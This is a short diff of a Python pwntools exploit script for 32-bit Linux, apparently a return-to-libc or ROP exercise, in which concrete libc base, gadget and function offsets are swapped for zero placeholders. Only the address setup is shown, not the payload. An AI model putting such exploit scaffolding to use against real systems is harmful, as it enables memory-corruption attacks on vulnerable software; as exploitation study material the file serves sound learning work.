@@ -15,19 +15,18 @@ from pwnlib.exception import PwnlibException
 
 context(arch='i386', os='linux')
 
-# Addresses have been currently censored, figure out yourself!
-
 # NOTE this might vary based on machine
-libc_entry = 0xf7dcf000
+libc_entry = 0x00000000
 
 # NOTE that you might have different offsets, depending on libc version
 #  and compiler settings
 offset_ppr = 0x00000000  # pop/pop/ret gadget 
-offset_pr = 0x00165e1d  # pop ebx;ret
+offset_pr = 0x00000000  # pop ebx;ret
 
-offset_exit = 0x000303d0
-offset_putchar = 0x00069920
+offset_exit = 0x00000000
+offset_putchar = 0x00000000
 
+# 0xf7e6740f
 
 
 def main():
